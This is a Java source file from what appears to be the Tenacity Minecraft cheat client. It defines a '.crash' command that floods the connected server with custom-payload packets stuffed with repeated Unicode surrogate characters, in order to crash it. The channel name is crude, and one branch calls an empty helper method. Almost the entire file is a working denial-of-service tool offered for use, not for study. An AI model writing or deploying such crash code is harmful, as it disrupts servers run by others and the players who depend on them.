package dev.tenacity.command.impl;

import dev.tenacity.Tenacity;
import dev.tenacity.command.AbstractCommand;
import dev.tenacity.exception.UnknownModuleException;
import dev.tenacity.module.Module;
import dev.tenacity.util.misc.ChatUtil;
import io.netty.buffer.Unpooled;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.lwjgl.input.Keyboard;

import java.nio.charset.StandardCharsets;

import static dev.tenacity.util.Utils.mc;

public final class CrasherCommand extends AbstractCommand {

    public CrasherCommand() {
        super("crash", "Sends packets to crash a server", ".crash (packet amount) (packet value or mn)", 2);
    }

    @Override
    public void onCommand(final String[] arguments) {
        String channelName = "bluetooth cum";
        String payload = "\uD834\uDD1E\uD834\uDD1E\uD834\uDD1E\uD834\uDD1E\uD834\uDD1E\uD834\uDD1E\uD834\uDD1E";
        byte[] payloadBytes = payload.getBytes(StandardCharsets.UTF_8);
        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());

        packetBuffer.writeBytes(payloadBytes);
        if (arguments.length > 0 && arguments[0].equalsIgnoreCase("mn")) {
            sendStringPayload(channelName, payload);
        } else {
            int packetCount = 1;
            if (arguments.length > 0) {
                try {
                    packetCount = Integer.parseInt(arguments[0]);
                } catch (NumberFormatException e) {
                    ChatUtil.error("Invalid packet amount. Defaulting to 1.");
                }
            }
            ChatUtil.enable("Sending " + packetCount + " packets!");
            for (int i = 0; i < packetCount; i++) {
                C17PacketCustomPayload customPacket = new C17PacketCustomPayload(channelName, packetBuffer);
                mc.thePlayer.sendQueue.addToSendQueue(customPacket);
                ChatUtil.success("Packet sent!");
            }
        }
    }
    private void sendStringPayload(String channelName, String payload) {

    }
}
